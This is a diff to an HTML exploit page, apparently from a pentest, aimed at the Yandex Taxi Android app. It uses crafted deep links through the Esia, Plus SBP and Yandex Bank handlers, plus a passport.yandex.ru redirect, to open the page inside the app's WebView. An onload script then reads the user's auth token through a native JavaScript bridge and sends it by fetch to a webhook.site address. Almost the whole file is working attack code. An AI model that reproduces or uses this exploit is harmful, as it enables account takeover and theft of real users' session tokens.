@@ -1,22 +1,31 @@
 <!DOCTYPE html>
 <html>
-<head><title>Pentest Taxi</title></head>
 <body>
-    <h2>Trigger Intent (Account Takeover Test)</h2>
+    <h2>Critical Exploit: Token Theft</h2>
     
-    <a href="ru.yandex.taxi.passport://esia?url=https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98">1. Attack via EsiaBindActivity</a><br><br>
+    <a href="ru.yandex.taxi.passport://esia?url=https://passport.yandex.ru/auth/finish?retpath=https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98">1. Attack via Esia (Wrapped)</a><br><br>
 
-    <a href="plus://ru.yandex.taxi/sbp/redirect?url=https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98">2. Attack via PlusSbpRedirect</a><br><br>
+    <a href="plus://ru.yandex.taxi/sbp/redirect?url=https://passport.yandex.ru/auth/finish?retpath=https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98">2. Attack via Plus SBP (Wrapped)</a><br><br>
 
-    <a href="yandextaxi://external?url=https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98">3. Attack via MainActivity</a><br><br>
+    <a href="yandexbank://ru.yandex.taxi/finish-esia?url=https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98">3. Attack via Yandex Bank</a><br><br>
 
     <script>
-        // Этот скрипт сработает, если Deep Link откроет ВНУТРЕННИЙ WebView
-        try {
-            var token = nativeAMAndroid.getToken();
-            fetch("https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98?stolen_token=" + token);
-            alert("Token Stolen: " + token);
-        } catch(e) {}
+        // Скрипт сработает, если редирект внутри WebView доведет до твоего сайта
+        window.onload = function() {
+            try {
+                var token = nativeAMAndroid.getToken();
+                if(token) {
+                    fetch("https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98?stolen_token=" + token);
+                    alert("Bingo! Token: " + token);
+                }
+            } catch(e) {
+                // Если не получилось, попробуем альтернативное имя
+                try {
+                    var t2 = Yandex.getToken();
+                    fetch("https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98?stolen_token_alt=" + t2);
+                } catch(err) {}
+            }
+        }
     </script>
 </body>
 </html>
